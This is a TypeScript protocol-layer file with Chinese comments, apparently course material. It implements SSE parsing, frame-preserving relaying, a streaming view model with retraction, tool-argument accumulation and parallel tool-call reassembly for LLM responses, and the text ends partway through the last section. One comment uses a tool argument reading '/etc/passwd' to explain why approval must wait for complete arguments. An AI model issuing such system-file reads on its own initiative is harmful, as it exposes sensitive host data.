/**
 * L16 的协议层参考实现。**一行 DOM API 都没有，一次 I/O 都不做。**
 *
 * 这个约束不是洁癖，是被三件事同时逼出来的：
 *
 *   1. labs/tsconfig.json 的 lib 里没有 DOM。这一层要能被 Node 侧的转发器用。
 *   2. 同一份逻辑要能在浏览器里跑。所以输入是 string 块，不是 ReadableStream。
 *   3. 它要能在 verify 里被确定性测试——**一次模型都不调**。
 *
 * 而第三条反过来决定了这一层该包含什么：**凡是能写成"给定字节序列、断言输出"
 * 的东西都在这里，凡是只能靠肉眼看的（打字机快慢、骨架屏好不好看）都不在。**
 *
 * 五个部分，对应 L02 和 L05 留下的欠条：
 *
 *   SseParser        原始字节 → 事件。L02 欠条二「转发不是搬运」
 *   relayFrames      服务端 → 浏览器的转发，不许攒、不许拆坏
 *   ViewModel        事件 → 视图模型，含 resetStep。L02 欠条一「撤回已渲染内容」
 *   JsonAccumulator  流式工具参数，以及「什么时候能给用户看」
 *   reassemble       并行工具调用的事件归位。L05 欠条「tool call 可视化」
 */

// ═══════════════════════════════════════════════════════════════════
// 一、SSE 帧解析
// ═══════════════════════════════════════════════════════════════════

export interface SseEvent {
  /** `event:` 字段。规范的默认值是 "message"，不是空串。 */
  type: string
  /** 多个 `data:` 行用 \n 连接后的结果。 */
  data: string
  /** 派发这个事件时的 last event ID（不是本事件带的 id）。 */
  lastEventId: string
}

/**
 * 一个符合 WHATWG「event stream」解析算法的增量解析器。
 *
 * ★ 为什么必须自己写一遍：你用 SDK 时没遇到这些坑，是因为 SDK 内部替你做了缓冲。
 * 但当你把这个流从**你自己的服务端**转发给浏览器时，你在那一层重新面对它。
 *
 * 而且这不是理论风险。Anthropic 的 SDK 真实修过这个 bug：CDN 把一个 SSE 帧
 * 切开，导致某一块里 `data:` 行缺失，下游 `JSON.parse('')` 直接崩。
 *
 * 规范里有九处「看起来无所谓但会咬人」的细节，下面逐条标了 ★。
 */
export class SseParser {
  /** 还没凑成完整行的残留。这一个字段就是欠条二的解药。 */
  private buf = ''
  /**
   * ★ 已经消费到哪个下标。
   *
   * 这里用偏移量而不是每取一行就 `buf = buf.slice(...)`，是因为后者是
   * **二次方**的：每行都要复制一次剩余缓冲。在一个几千个事件的长回答上，
   * 那个 slice 的总开销会超过解析本身——而它的症状是「越到后面越卡」，
   * 很容易被错怪到渲染上。
   */
  private pos = 0
  private dataBuf = ''
  private typeBuf = ''
  /** ★ last event ID 是**跨事件保持**的，不随每个事件重置。 */
  private lastEventId = ''
  private retryMs: number | null = null
  private sawBom = false

  /** 上一块是否以 \r 结尾——用来判断跨块的 \r\n 不要当成两个换行。 */
  private pendingCr = false

  get reconnectionTimeMs(): number | null {
    return this.retryMs
  }

  /**
   * 喂一块数据，拿回这一块里**已经完整**的事件。
   * 不完整的部分留在内部缓冲里，等下一块。
   */
  feed(chunk: string): SseEvent[] {
    if (!this.sawBom) {
      this.sawBom = true
      // ★ 只剥**第一个**字符位置上的 BOM，而且只剥一次。
      // 流中间出现的 U+FEFF 是正常内容。
      if (chunk.startsWith('\uFEFF')) chunk = chunk.slice(1)
    }

    this.buf += chunk
    const out: SseEvent[] = []

    for (;;) {
      const line = this.takeLine()
      if (line === null) break
      const ev = this.processLine(line)
      if (ev) out.push(ev)
    }

    // 每块结束时压缩一次，把偏移量归零。整体是 O(总字节数)。
    if (this.pos > 0) {
      this.buf = this.buf.slice(this.pos)
      this.pos = 0
    }
    return out
  }

  /**
   * 流结束了。
   *
   * ★★ 注意它**什么都不返回**：规范明确规定，流末尾那个没有以空行收尾的事件
   * 要被**直接丢弃**。
   *
   * 这一条是「必须区分流正常结束和流断了」在传输层的镜像——
   * 一个把残留缓冲也 flush 出去的解析器，会把半个事件当成完整事件交给上层，
   * 而上层没有任何办法发现这件事。
   */
  end(): void {
    this.buf = ''
    this.pos = 0
    this.dataBuf = ''
    this.typeBuf = ''
    this.pendingCr = false
  }

  /** 取出一个完整行；取不到（没遇到行结束符）返回 null。 */
  private takeLine(): string | null {
    const buf = this.buf

    // ★★ 跨块的 CRLF：上一块以 \r 结尾时我们已经把它当成行结束符了，
    // 所以这一块开头如果是 \n，它属于**上一个**结束符，要吃掉。
    // 漏掉这一步会凭空多出一个空行，也就是凭空多派发一个事件。
    if (this.pendingCr && this.pos < buf.length) {
      this.pendingCr = false
      if (buf[this.pos] === '\n') this.pos++
    }

    // ★ 规范允许三种行结束符：CRLF、LF、CR。只处理 \n 的解析器，
    // 在一个用 \r 的服务端面前会把整个流当成一行。
    let i = this.pos
    while (i < buf.length) {
      const c = buf[i]!
      if (c === '\n') {
        const line = buf.slice(this.pos, i)
        this.pos = i + 1
        return line
      }
      if (c === '\r') {
        const line = buf.slice(this.pos, i)
        if (i + 1 < buf.length) {
          // 同一块里就能看到下一个字符，直接判断
          this.pos = buf[i + 1] === '\n' ? i + 2 : i + 1
        } else {
          // \r 正好在块尾：先当成结束符，记住下一块开头的 \n 要吃掉
          this.pos = i + 1
          this.pendingCr = true
        }
        return line
      }
      i++
    }
    return null
  }

  private processLine(line: string): SseEvent | null {
    // 空行 → 派发
    if (line === '') return this.dispatch()

    // ★ 以冒号开头的是注释，整行忽略。
    // 它的正经用途是保活——规范正文里就写着用注释行防止连接超时，
    // 建议间隔约 15 秒。所以你的解析器必须**安静地**忽略它，
    // 而不是当成一个 data 为空的事件。
    if (line.startsWith(':')) return null

    const colon = line.indexOf(':')
    let field: string
    let value: string
    if (colon === -1) {
      // ★ 没有冒号的整行是字段名，值为空串。`data` 单独一行是合法的。
      field = line
      value = ''
    } else {
      field = line.slice(0, colon)
      value = line.slice(colon + 1)
      // ★★ 只忽略**一个**前导空格。`data:  x` 的值是 " x"（带一个空格），
      // 不是 "x"。用 trimStart() 的实现会悄悄改掉用户的内容。
      if (value.startsWith(' ')) value = value.slice(1)
    }

    switch (field) {
      case 'event':
        this.typeBuf = value
        break
      case 'data':
        // ★ 多个 data 行用 \n 连接。这里先无条件追加 \n，派发时再去掉末尾那个。
        this.dataBuf += value + '\n'
        break
      case 'id':
        // ★ 含 U+0000 的 id 整个字段忽略。
        // 而**空的** id 是合法的，它把 last event ID 重置成空串——
        // 这是服务端主动说「别再带 Last-Event-ID 了」的唯一方式。
        if (!value.includes('\u0000')) this.lastEventId = value
        break
      case 'retry': {
        // ★ 只接受纯 ASCII 数字，否则**静默失效**。
        // `retry: 3000ms` 不会报错，只是什么都不做。
        if (value.length > 0 && /^[0-9]+$/.test(value)) this.retryMs = Number(value)
        break
      }
      default:
        // ★ 未知字段忽略。这是协议的前向兼容机制，不是可以省掉的分支——
        // Anthropic 会在流里插入任意数量的 ping 事件，
        // 官方要求客户端优雅处理未知事件类型。
        break
    }
    return null
  }

  private dispatch(): SseEvent | null {
    // ★★ 顺序很重要：last event ID 的更新**发生在**「data 是否为空」的判断之前。
    // 也就是说一个只有 `id:` 的事件（data 为空）不会被派发，
    // 但它**确实**改变了 last event ID。
    const id = this.lastEventId

    if (this.dataBuf === '') {
      // data 为空不派发，但 event type 要清掉
      this.typeBuf = ''
      return null
    }

    let data = this.dataBuf
    if (data.endsWith('\n')) data = data.slice(0, -1)

    // ★ 规范的默认事件类型是 "message"，不是空串。
    const type = this.typeBuf === '' ? 'message' : this.typeBuf

    this.dataBuf = ''
    this.typeBuf = ''
    return { type, data, lastEventId: id }
  }
}

/** 把一批块喂进一个解析器，返回全部事件。测试和转发都用得上。 */
export function parseAll(chunks: string[]): SseEvent[] {
  const p = new SseParser()
  const out: SseEvent[] = []
  for (const c of chunks) out.push(...p.feed(c))
  p.end()
  return out
}

/**
 * 增量 UTF-8 解码。★★ 这一层在 SseParser **之前**，而且漏掉它的后果很丑。
 *
 * 规范规定 event stream 永远按 UTF-8 解码。而网络给你的是**字节**，
 * 字节边界和字符边界没有任何关系——一个中文字符占三字节，
 * 它完全可能被切在第二个字节上。
 *
 * 于是这个写法是错的：
 *
 *     for await (const chunk of res.body) {
 *       parser.feed(new TextDecoder().decode(chunk))   // ← bug
 *     }
 *
 * 每块新建一个解码器，等于告诉它「这一块就是完整的输入」。
 * 被切断的那个字符会变成 U+FFFD（就是那个 �），而且**不可恢复**——
 * 下一块开头的两个字节也会各自变成一个 �。
 *
 * 症状是中文/emoji 偶发乱码，而且只在特定长度的回答上出现，
 * 因为它取决于 TCP 分片恰好落在哪里。这类 bug 在本地几乎测不出来。
 *
 * 正确做法是**一个长期存在的流式解码器**，它自己会把不完整的尾字节留住。
 */
export class Utf8Stream {
  private dec = new TextDecoder('utf-8')

  /** ★ `stream: true` 是关键：它让解码器保留不完整的尾部，等下一块。 */
  push(bytes: Uint8Array): string {
    return this.dec.decode(bytes, { stream: true })
  }

  /**
   * 流结束。★ 这里**不带** stream 标志，所以残留的不完整字节会变成 �。
   * 那正是想要的：它是「流断在字符中间」的可见证据，而不是静默丢弃。
   */
  end(): string {
    return this.dec.decode()
  }
}

// ═══════════════════════════════════════════════════════════════════
// 二、转发：不许攒，也不许拆坏
// ═══════════════════════════════════════════════════════════════════

export interface RelayOut {
  /** 这一次输入产生的输出块。空数组表示「这一块还凑不成一个完整事件」。 */
  emit: string[]
  /** 还压在手上的字节数。用来证明转发器没有在攒整段。 */
  held: number
}

/**
 * 一个正确的转发器：服务端收到上游的块，重新发给浏览器。
 *
 * ★ 它要同时满足两条**互相拉扯**的性质：
 *
 *   完整性：绝不把一个事件拆成两半发出去（下游会 JSON.parse 半个 JSON）
 *   及时性：绝不等整段到齐才发（那就不是流了，只是个慢接口）
 *
 * naive 实现会犯两类错，而且它们是相反方向的：
 *
 *   `res.write(chunk)` 原样转发 —— 及时但会把帧拆坏（上游的块边界和帧边界无关）
 *   `await collect(); res.write(all)` —— 完整但把流变成了阻塞接口
 *
 * 正确做法是**按帧转发**：攒到完整的帧就立刻发，只把不完整的尾巴留在手上。
 * 所以 held 永远小于一个帧的长度，而不是小于整段的长度。
 */
export class Relay {
  private buf = ''

  push(chunk: string): RelayOut {
    this.buf += chunk
    const emit: string[] = []

    for (;;) {
      const at = findFrameEnd(this.buf)
      if (at === null) break
      emit.push(this.buf.slice(0, at))
      this.buf = this.buf.slice(at)
    }
    return { emit, held: this.buf.length }
  }

  /** 流结束。★ 残留的不完整帧**丢弃**，理由和 SseParser.end 一样。 */
  end(): { dropped: number } {
    const dropped = this.buf.length
    this.buf = ''
    return { dropped }
  }

}

/**
 * 返回第一个帧结束位置（含结束符），没有完整帧则返回 null。
 *
 * ★★ 这个函数是整个转发器里唯一不能偷懒的地方，理由值得单独说。
 *
 * 「用 `indexOf('\n\n')` 找边界」是一个**会漏**的实现。因为规范允许三种行结束符
 * 任意混用，而「空行」= 两个连续的行结束符，所以它有**八种**可分辨的字节组合：
 *
 *     \r\n\r\n   \r\n\n   \r\n\r   \n\r\n   \n\n   \n\r   \r\r\n   \r\r
 *
 * （CR 后面跟 LF 那一种不算，因为它就是一个 CRLF，不是两个结束符。）
 *
 * 一个只找 `\n\n` 的转发器会在混用的流上**永远找不到边界**，于是一路攒到流结束——
 * 表现是「流式接口能用，但一点都不流」，而且日志全绿。
 *
 * 所以这里不去搜分隔符，而是**按行切**：逐个吃掉行结束符，遇到空行就是帧尾。
 *
 * ★ 有一处一字节的含糊：如果缓冲正好在 `\r` 处结束，我们无法知道下一块是不是
 * 以 `\n` 开头。这里选择在 `\r` 处切开，那个 `\n` 归下一帧。这是**安全的**——
 * 切点只影响字节什么时候被冲出去，不影响冲出去的是哪些字节，
 * 而下游多看到一个开头的空行只会得到一次「data 为空、不派发」。
 */
export function findFrameEnd(s: string): number | null {
  let lineStart = 0
  let i = 0
  while (i < s.length) {
    const c = s[i]!
    let termEnd: number
    if (c === '\n') {
      termEnd = i + 1
    } else if (c === '\r') {
      termEnd = i + 1 < s.length && s[i + 1] === '\n' ? i + 2 : i + 1
    } else {
      i++
      continue
    }
    // 这一行是空行 → 帧在这里结束
    if (i === lineStart) return termEnd
    lineStart = termEnd
    i = termEnd
  }
  return null
}

/**
 * 转发一整条流，返回输出块序列。
 *
 * ★ 这个函数存在的唯一目的是让下面这条性质可以被断言：
 * **无论输入被怎么切块，输出拼起来必须和输入逐字节相同。**
 * verify 里用随机切割点跑一百遍。
 */
export function relayFrames(chunks: string[]): string[] {
  const r = new Relay()
  const out: string[] = []
  for (const c of chunks) out.push(...r.push(c).emit)
  r.end()
  return out
}

export interface RelayStat {
  /** 转发器吐出的块数 */
  emitted: number
  /** 这条流本来有多少个事件 */
  wantEvents: number
  /** 一个 naive 下游能解析出多少个 */
  naiveEvents: number
  /** naive 下游崩了几次 */
  naiveCrashes: number
  naiveOk: boolean
  /** 输出拼起来是否和输入逐字节相同 */
  bytewise: boolean
}

/**
 * 把一串块转发给一个**naive 下游**，看它能不能活。
 *
 * ★★ 这个函数存在的意义是把「转发不是搬运」变成一个可以运行的对照实验。
 *
 * naive 下游 = 对每一块直接 `JSON.parse(data 行)`。很多人第一版就这么写，
 * 而且在本地一定能过——因为本地没有那个会重新分帧的中间层。
 *
 * ★ 注意一件事：如果下游是一个**有状态**的解析器，转发器怎么切都无所谓，
 * 因为它看到的是同一串字节。所以按帧转发的真正价值是**防御性的**：
 * 它让一个写错的下游也能正常工作。而你通常没法控制下游怎么写
 * （那可能是别人的浏览器里的一段代码，或者一个第三方 SDK）。
 */
export function chopRelay(chunks: string[], byFrame: boolean): RelayStat {
  const src = chunks.join('')
  const out: string[] = byFrame ? relayFrames(chunks) : [...chunks]

  let naiveEvents = 0
  let naiveCrashes = 0
  for (const c of out) {
    for (const line of c.split('\n')) {
      if (!line.startsWith('data:')) continue
      try {
        JSON.parse(line.slice(5).trim())
        naiveEvents++
      } catch {
        naiveCrashes++
      }
    }
  }

  const wantEvents = parseAll([src]).length
  return {
    emitted: out.length,
    wantEvents,
    naiveEvents,
    naiveCrashes,
    naiveOk: naiveEvents === wantEvents && naiveCrashes === 0,
    // ★ 按帧转发会丢掉末尾不完整的帧（和解析器 end() 同一个理由），
    // 所以这里比较的是「输出是输入的前缀」而不是完全相等。
    bytewise: src.startsWith(out.join('')),
  }
}

// ═══════════════════════════════════════════════════════════════════
// 三、视图模型与「撤回已渲染内容」
// ═══════════════════════════════════════════════════════════════════

export type PartKind = 'text' | 'reasoning' | 'tool'

export interface Part {
  kind: PartKind
  /** 同一个 id 的后续 delta 追加到同一个 part 上。 */
  id: string
  text: string
  /** tool part 才有。 */
  toolName?: string
  /** tool part 才有。四个状态见 ArgsState——**不是**「好了/没好」两态。 */
  args?: ArgsState
  /** 这个 part 是在第几个 step 里产生的。resetStep 靠它定位。 */
  step: number
}

export type Chunk =
  | { type: 'start-step' }
  | { type: 'finish-step' }
  /** ★★ 这一条是 L02 欠条一在真实线协议里的对应物，见下面的注释。 */
  | { type: 'reset-step' }
  | { type: 'text-delta'; id: string; delta: string }
  | { type: 'reasoning-delta'; id: string; delta: string }
  | { type: 'tool-input-start'; id: string; toolName: string }
  | { type: 'tool-input-delta'; id: string; delta: string }
  | { type: 'tool-input-end'; id: string }
  /** ★ max_tokens 会在**参数中间**切断。这条路径要撤回，不要修补。 */
  | { type: 'stop-reason'; reason: 'end_turn' | 'max_tokens' | 'tool_use' }
  | { type: 'abort'; reason: string }
  | { type: 'error'; message: string }

/**
 * ★★ 解析器**必须**能吃下它不认识的 chunk。
 *
 * 「严格校验、遇到未知字段就报错」在普通前端里是美德，在流式协议里是 bug。
 * AI SDK 的 chunk schema 每一个 variant 都用宽松对象（容忍未知字段），
 * 这是有意的前向兼容设计；Anthropic 把它写成了明文规定——
 * 新的事件类型可能随时加进来，你的代码要优雅处理未知类型。
 *
 * 而这条有一个非常具体的现实后果：OpenAI 在 chunk 里加了一个 `obfuscation`
 * 字段之后（那个字段本身是为了防侧信道，见下文），
 * 做严格校验的客户端直接挂了——有真实的 issue 记录。
 */
export type UnknownChunk = { type: string; [key: string]: unknown }

export type Status = 'streaming' | 'done' | 'aborted' | 'failed'

export interface View {
  parts: Part[]
  step: number
  status: Status
  /** aborted / failed 时的原因。 */
  reason: string | null
  /** 累计撤回过多少个 part。审计用——它不该在正常运行里增长。 */
  retracted: number
}

export function emptyView(): View {
  return { parts: [], step: 0, status: 'streaming', reason: null, retracted: 0 }
}

/**
 * 把一个 chunk 应用到视图模型上。纯函数，返回新的 View。
 *
 * ★★ resetStep 是这一节的核心，值得说清楚它为什么必须存在于**协议层**
 * 而不是「前端自己想办法」。
 *
 * L02 讲过：流式打破了「成功和失败互斥」这个假设。HTTP 头已经发出去了，
 * 所以服务端只能在流**内部**报错——而这时你可能已经把半段文字渲染到屏幕上了。
 * L02 当时给的结论是：重试不保留那半段，重发整个请求，前端丢弃已渲染的部分。
 *
 * 问题是「丢弃已渲染的部分」需要知道**丢弃到哪里为止**。而这个边界
 * 前端自己是算不出来的：它不知道服务端是在第一次尝试里失败的、
 * 还是已经成功了半个 step 又在下一个 step 失败的。
 *
 * 所以它必须是服务端发过来的一个**显式信号**。Vercel AI SDK 的线协议里
 * 就有这个 chunk，官方描述是「removes all message parts added during the
 * current step」，用途是「invalidate partial output from a failed streamed
 * step before replacement output arrives」。
 *
 * 也就是说：**这不是一个我编的设计，是一个已经在生产协议里的东西。**
 */
export function applyChunk(v: View, chunk: Chunk | UnknownChunk): View {
  const c = chunk as Chunk
  const parts = [...v.parts]

  // ★★ abort / failed 之后是**终态**。后到的内容块要丢掉。
  //
  // 这一条不是洁癖：用户点了停止之后，管线里可能还有已经在路上的 delta。
  // 一个继续 append 的实现会在用户按下停止之后**还往屏幕上写字**，
  // 而这是所有「停止按钮好像没用」的投诉里最常见的那个原因。
  if (v.status === 'aborted' || v.status === 'failed') {
    const terminal = c.type !== 'abort' && c.type !== 'error'
    if (terminal) return v
  }

  switch (c.type) {
    case 'start-step':
      return { ...v, step: v.step + 1 }

    // ★ finish-step 结束的是**一个 step**，不是整条消息。一条消息可以有多个
    // step（每次工具调用一轮）。所以它不改 status——终态由 stop-reason 决定。
    case 'finish-step':
      return v

    case 'reset-step': {
      // ★ 只删**当前 step** 的 part。更早的 step 是已经成功的内容，
      // 把它们一起删掉就等于把成功的输出也丢了。
      const kept = parts.filter((p) => p.step !== v.step)
      return { ...v, parts: kept, retracted: v.retracted + (parts.length - kept.length) }
    }

    case 'text-delta':
    case 'reasoning-delta': {
      const kind: PartKind = c.type === 'text-delta' ? 'text' : 'reasoning'
      const i = parts.findIndex((p) => p.id === c.id && p.kind === kind)
      if (i === -1) {
        parts.push({ kind, id: c.id, text: c.delta, step: v.step })
      } else {
        parts[i] = { ...parts[i]!, text: parts[i]!.text + c.delta }
      }
      return { ...v, parts }
    }

    case 'tool-input-start':
      parts.push({
        kind: 'tool',
        id: c.id,
        toolName: c.toolName,
        text: '',
        args: 'streaming',
        step: v.step,
      })
      return { ...v, parts }

    case 'tool-input-delta': {
      const i = parts.findIndex((p) => p.id === c.id && p.kind === 'tool')
      // ★ 收到 delta 但没有对应的 start，说明事件乱序或丢了。
      // 静默创建一个 part 会掩盖这件事，所以这里抛错。
      if (i === -1) throw new Error(`tool-input-delta 找不到对应的 part：${c.id}`)
      parts[i] = { ...parts[i]!, text: parts[i]!.text + c.delta }
      return { ...v, parts }
    }

    case 'tool-input-end': {
      const i = parts.findIndex((p) => p.id === c.id && p.kind === 'tool')
      if (i === -1) throw new Error(`tool-input-end 找不到对应的 part：${c.id}`)
      // ★ 到这里参数才算收完。但**收完不等于可执行**：字符串仍然可能不是
      // 合法 JSON。所以这里只判 ready / invalid，理由见 JsonAccumulator。
      const raw = parts[i]!.text
      let state: ArgsState = 'ready'
      if (raw !== '') {
        try {
          JSON.parse(raw)
        } catch {
          state = 'invalid'
        }
      }
      parts[i] = { ...parts[i]!, args: state }
      return { ...v, parts }
    }

    case 'stop-reason': {
      if (c.reason !== 'max_tokens') return { ...v, status: 'done' }
      // ★★ max_tokens 会在**参数中间**把响应切断。
      //
      // 官方明文说这时候的正确动作是提高 max_tokens 重试，而**不是**修补那个
      // 半截参数——修补等于替模型猜它想干什么。所以这里把没收完的工具调用
      // 直接撤回，而不是留在屏幕上让用户以为它还能点。
      //
      // 这是 reset-step 之外**第二条**通往撤回的路径，而它比 reset-step 更容易
      // 漏：流是正常结束的，HTTP 200，没有任何错误事件。
      const kept = parts.filter((p) => !(p.kind === 'tool' && p.args === 'streaming'))
      return {
        ...v,
        parts: kept,
        status: 'done',
        reason: 'max_tokens 在参数中途截断',
        retracted: v.retracted + (parts.length - kept.length),
      }
    }

    case 'abort':
      return { ...v, status: 'aborted', reason: c.reason }

    case 'error':
      return { ...v, status: 'failed', reason: c.message }

    default:
      // ★★ 未知的 chunk 类型**静默忽略**，理由见 UnknownChunk 的注释。
      // 这里写 return v 而不是 throw，是整个文件里唯一一处
      // 「不报错」比「报错」更正确的地方。
      return v
  }
}

export function applyAll(chunks: (Chunk | UnknownChunk)[], from: View = emptyView()): View {
  return chunks.reduce(applyChunk, from)
}

/** 只取给用户看的正文。★ 参数还没收完的工具调用不算。 */
export function visibleText(v: View): string {
  return v.parts
    .filter((p) => p.kind === 'text')
    .map((p) => p.text)
    .join('')
}

// ═══════════════════════════════════════════════════════════════════
// 四、被截断的消息能不能放回历史
// ═══════════════════════════════════════════════════════════════════

export interface ResumeCheck {
  ok: boolean
  reason: string
  /** 可以安全回传的 part 下标（含）。-1 表示一个都不能带。 */
  safeUpTo: number
}

/**
 * 用户点了停止，或者流断了。这半截 assistant 消息能不能放回对话历史里接着续？
 *
 * ★★ 这里有一个 2026 年的反转，而且方向和"经典做法"完全相反。
 *
 * 「把半截 assistant 消息放回去让模型接着写」这个技巧（prefill / 续写）
 * 在 Claude 4.6 及以后**直接返回 400**，不是降级，是报错。
 * 恢复中断的流现在要改用一条 **user** 消息来表达。
 *
 * 而且不是所有块都能带回去：
 *
 *   text 块       —— 最后一个**完整的** text 块之前都可以
 *   tool_use 块   —— 不能部分恢复
 *   thinking 块   —— 不能部分恢复，而且必须原样回传，改一个字就是 400
 *
 * thinking 那条格外阴：它意味着**客户端做上下文压缩会打掉 thinking 块**
 * （某些模型上有前缀绑定校验）。这条直接咬 L06。
 *
 * 所以这个函数的职责是**拦住**一个很自然的想法，而不是实现它。
 */
export function checkResumable(v: View): ResumeCheck {
  if (v.status === 'streaming') {
    return { ok: false, reason: '流还没结束，现在判断还早', safeUpTo: -1 }
  }

  // 参数没收完或收完了但不合法的工具调用：不能部分恢复
  const badTool = v.parts.findIndex((p) => p.kind === 'tool' && p.args !== 'ready')
  if (badTool !== -1) {
    return {
      ok: false,
      reason:
        '有一个工具调用的参数只收到一半。tool_use 块不能部分恢复——' +
        '把半个 JSON 放回历史，模型下一轮会拿到一个它没法解析的参数',
      safeUpTo: badTool - 1,
    }
  }

  // reasoning：只要存在就不能当 prefill 带回去
  const hasReasoning = v.parts.some((p) => p.kind === 'reasoning')
  if (hasReasoning) {
    return {
      ok: false,
      reason:
        'thinking 块必须原样回传且不能部分恢复。被截断的那一段没法原样回传，' +
        '改一个字就是 400',
      safeUpTo: -1,
    }
  }

  const lastText = v.parts.reduce((acc, p, i) => (p.kind === 'text' ? i : acc), -1)
  if (lastText === -1) {
    return { ok: false, reason: '没有任何完整的 text 块可以接续', safeUpTo: -1 }
  }

  return {
    ok: false,
    reason:
      '内容上可以从最后一个完整 text 块处恢复，但**不要用 prefill**：' +
      'Claude 4.6 及以后对 assistant 预填返回 400。改成用一条 user 消息表达「接着上面继续」',
    safeUpTo: lastText,
  }
}

// ═══════════════════════════════════════════════════════════════════
// 五、流式工具参数：什么时候能给用户看
// ═══════════════════════════════════════════════════════════════════

/**
 * 参数累积的状态。★★ 四个状态，而不是「好了/没好」两个。
 *
 * `truncated` 是最容易漏的一个：`max_tokens` 会在**参数中间**把响应切断。
 * 官方明文说这时候不能执行，只能提高 max_tokens 重试或者修补参数。
 * 一个只有「合法/非法」两态的实现会把它归到「非法」，于是走上修补的路——
 * 而正确的动作是重试。
 */
export type ArgsState = 'streaming' | 'ready' | 'invalid' | 'truncated'

export interface Accumulated {
  state: ArgsState
  /**
   * ★ 累积到现在的原始字符串。**这个可以展示**——官方 SDK 就是把它作为
   * snapshot 吐出来的（`event.snapshot` → `'{"message": "Hello, there"'`）。
   */
  snapshot: string
  /** 解析成功时的值；其余情况是 null。 */
  value: unknown
  /**
   * ★ 解析失败时，官方的做法不是丢掉，而是把原始字符串包进一个
   * INVALID_JSON 字段回传给模型，让它自己看到自己吐了什么。
   */
  invalidJson: string | null
  /**
   * ★★ **能不能执行**。注意它和「能不能展示」是两件事——
   * 这是本节最容易合并错的一处边界，见 JsonAccumulator 的注释。
   */
  canExecute: boolean
}

/**
 * 把一个非法参数包成可以回传给模型的 tool result。
 *
 * ★ 官方特别交代了一句：**用 JSON 库构造这个包装，不要拼字符串。**
 * 理由很实际——非法的参数里几乎一定有引号（那通常就是它非法的原因），
 * 拼字符串会让包装本身也变成非法 JSON，于是你把一个解析错误
 * 变成了两个，而且第二个发生在你自己的代码里。
 */
export function invalidJsonPayload(raw: string): string {
  return JSON.stringify({ INVALID_JSON: raw })
}

/**
 * 流式工具参数的累积器。
 *
 * ★★ 这里有两个会让人意外的地方。
 *
 * **第一个：默认情况下你根本看不到「半个参数」。**
 * 非 fine-grained 模式下，模型一次发送一个**完整的键值对**。
 * 想看到真正半截的 JSON 流，得显式开 eager input streaming。
 * 所以「工具参数是逐字符流过来的」这个印象，对默认配置是错的。
 *
 * **第二个：开了 fine-grained 之后，累积出来的字符串不保证是合法 JSON。**
 * 不是「中途不合法、最后合法」——是**最后也可能不合法**。
 *
 * 还有一个类型上的坑：Anthropic 的 content_block_start 里
 * `tool_use.input` 是一个**空对象** `{}`，而后续的 delta 是**字符串**。
 * 一个按 input 的类型去累积的实现，会在第一个 delta 上就类型错。
 */
export class JsonAccumulator {
  private raw = ''
  private closed = false
  private cutOff = false

  push(delta: string): void {
    if (this.closed) throw new Error('已经 stop 过了，不该再收到 delta')
    this.raw += delta
  }

  /** 对应 content_block_stop。★ 只有它之后 canExecute 才**可能**为 true。 */
  close(): void {
    this.closed = true
  }

  /**
   * 对应 `stop_reason === 'max_tokens'`。
   * ★ 它和 close 是不同的结束方式，而且结论相反：close 之后可能可执行，
   * 这个之后**一定不可执行**。
   */
  truncate(): void {
    this.closed = true
    this.cutOff = true
  }

  get(): Accumulated {
    // ★★ 这里是本节最容易合并错的一条边界，值得把两件事拆开说。
    //
    // **能展示** 和 **能执行** 不是一回事。
    //
    // 官方 SDK 在每个 delta 上都吐一个 snapshot（累积到现在的原始字符串），
    // 明确是给你展示用的——所以「参数正在流入」这个进度是可以画出来的。
    //
    // 但**执行**的唯一安全点是 content_block_stop。而这条边界之所以是安全
    // 边界而不是体验偏好：一个半截的
    //   {"path": "/etc/pass
    // 在审批界面上会被读成「要读 /etc/pass」，而完整的参数可能是
    //   {"path": "/etc/passwd", "dryRun": true}
    // 反过来也成立——半截的参数可能看起来无害，补全之后才危险。
    //
    // 所以结论不是「不许展示」，而是：**审批必须卡在 canExecute 上，
    // 不能卡在 snapshot 上。** 让用户对一个还没成形的动作点「允许」，
    // 是把 L14 那一整节的努力白费掉的最快方式。
    if (!this.closed) {
      return {
        state: 'streaming',
        snapshot: this.raw,
        value: null,
        invalidJson: null,
        canExecute: false,
      }
    }

    if (this.cutOff) {
      // ★ 被 max_tokens 切断。官方说这时候的正确动作是**提高 max_tokens 重试**，
      // 而不是去修补这个半截参数——修补等于替模型猜它想干什么。
      return {
        state: 'truncated',
        snapshot: this.raw,
        value: null,
        invalidJson: null,
        canExecute: false,
      }
    }

    // ★ 零 delta 是合法的，结果是空对象而不是解析错误。
    // 这种块在 Anthropic 的流里有明确含义，见 reassemble 的注释。
    if (this.raw === '') {
      return { state: 'ready', snapshot: '', value: {}, invalidJson: null, canExecute: true }
    }

    try {
      const value = JSON.parse(this.raw)
      return { state: 'ready', snapshot: this.raw, value, invalidJson: null, canExecute: true }
    } catch {
      // ★ 注意「收到了 stop」并不保证字符串合法。官方原话是
      // the accumulated string might not be valid JSON——不是「中途不合法」，
      // 是**最后也可能不合法**。
      return {
        state: 'invalid',
        snapshot: this.raw,
        value: null,
        invalidJson: this.raw,
        canExecute: false,
      }
    }
  }
}

// ═══════════════════════════════════════════════════════════════════
// 六、并行工具调用的事件归位
// ═══════════════════════════════════════════════════════════════════

export interface RawToolEvent {
  /** 全局单调序号。乱序到达时靠它排。 */
  seq: number
  /** 同一个工具调用的事件共享它。 */
  itemId: string
  /** 这个工具调用在输出里的位置。 */
  outputIndex: number
  phase: 'start' | 'delta' | 'stop'
  toolName?: string
  delta?: string
}

export interface ToolCall {
  itemId: string
  outputIndex: number
  toolName: string
  args: Accumulated
}

export interface Reassembled {
  calls: ToolCall[]
  /**
   * ★★ 零 delta 的空块。它**不是**一个工具调用。
   *
   * Anthropic 的流在服务端**中途换模型**时，会在每个模型边界插入一个
   * 只有 start 和 stop、中间一条 delta 都没有的块。
   *
   * 也就是说「一个流对应一个模型」这个假设是错的——一条流可以由两个模型
   * 接力写完。如果你的解析器假设「每个块至少有一个 delta」，
   * 它会在 fallback 发生时静默出错（把这个空块当成一个参数为空的工具调用）。
   *
   * 而这件事有 UI 后果：**你可能需要在流中途告诉用户「下面这段是另一个
   * 模型写的」。** 普通 Web 应用里没有任何对应物。
   */
  modelBoundaries: number[]
}

/**
 * 把交错到达的工具事件归位成一组工具调用。
 *
 * ★ 并行工具调用的事件**会交错**：A 的 delta、B 的 delta、A 的 delta……
 * 归位靠 itemId / outputIndex，排序靠全局 seq。
 *
 * 一个按到达顺序往「当前工具」上追加的实现，会把 B 的参数拼到 A 上。
 * 而这个 bug 的表现是**两个工具都拿到语法合法但内容串味的参数**——
 * 不抛异常，日志是绿的，只是 agent 去读了一个它没打算读的文件。
